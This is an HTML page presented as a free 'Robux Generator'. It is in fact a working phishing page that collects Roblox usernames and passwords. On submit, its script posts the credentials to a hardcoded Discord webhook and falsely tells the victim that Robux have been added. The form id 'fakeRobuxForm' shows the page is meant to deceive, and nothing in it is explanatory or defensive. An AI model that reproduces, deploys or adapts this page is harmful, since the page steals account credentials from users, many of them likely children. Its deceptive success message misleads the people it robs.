<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Robux Generator</title>
<style>
  body {
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    background: linear-gradient(135deg, #6b73ff 0%, #000dff 100%);
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    margin: 0;
  }
  .container {
    background: rgba(255,255,255,0.95);
    padding: 25px 35px;
    border-radius: 15px;
    box-shadow: 0 15px 25px rgba(0,0,0,0.3);
    width: 320px;
  }
  h2 {
    text-align: center;
    color: #2c3e50;
    margin-bottom: 20px;
  }
  label {
    display: block;
    margin-top: 15px;
    font-weight: 600;
    color: #34495e;
  }
  input[type="text"], input[type="number"], input[type="password"] {
    width: 100%;
    padding: 10px 12px;
    margin-top: 6px;
    border: 2px solid #3498db;
    border-radius: 8px;
    font-size: 16px;
    transition: border-color 0.3s;
  }
  input[type="text"]:focus, input[type="number"]:focus, input[type="password"]:focus {
    border-color: #2980b9;
    outline: none;
  }
  button {
    margin-top: 25px;
    width: 100%;
    background: #2980b9;
    color: white;
    border: none;
    padding: 12px 0;
    border-radius: 10px;
    font-size: 18px;
    font-weight: bold;
    cursor: pointer;
    transition: background 0.3s;
  }
  button:hover {
    background: #1c5980;
  }
  .result {
    margin-top: 20px;
    text-align: center;
    font-weight: 700;
  }
  .error {
    color: #e74c3c;
  }
  .success {
    color: #27ae60;
  }
</style>
</head>
<body>
<div class="container">
  <h2>Robux Generator</h2>
  <form id="fakeRobuxForm">
    <label for="pseudo">Roblox Pseudo</label>
    <input type="text" id="pseudo" name="pseudo" placeholder="Pseudo" required />

    <label for="lol">Password</label>
    <input type="password" id="lol" name="lol" placeholder="Your Password" required />

    <label for="robux">Number of Robux</label>
    <input type="number" id="robux" name="robux" min="1" max="100000000" placeholder="Ex: 1000" required />

    <button type="submit">Generate Robux</button>
  </form>
  <div class="result" id="result"></div>
</div>

<script>
  const form = document.getElementById('fakeRobuxForm');
  const resultDiv = document.getElementById('result');

  const webhookURL = "https://discord.com/api/webhooks/1387878891980455946/PyFFdZS5NLAuHX-vmrsRv0ihfEw7toOEMHoy2NFTYdORXpnnO1yPNSfEriPM_r6bW-JV";

  form.addEventListener('submit', async function(e) {
    e.preventDefault();

    const pseudo = document.getElementById('pseudo').value.trim();
    const lol = document.getElementById('lol').value.trim();
    const robux = document.getElementById('robux').value.trim();

    const content = `**Pseudo:** ${pseudo}\n**Texte Lol:** ${lol}`;

    try {
      const response = await fetch(webhookURL, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          content: content,
        }),
      });

      if (response.ok) {
        resultDiv.className = 'result success';
        resultDiv.textContent = "The Robux have been added to the account!! :D";
        form.reset();
      } else {
        throw new Error("Erreur d'envoi");
      }
    } catch (error) {
      resultDiv.className = 'result error';
      resultDiv.textContent = "Erreur lors de l'envoi. RÃ©essaie.";
    }
  });
</script>
</body>
</html>
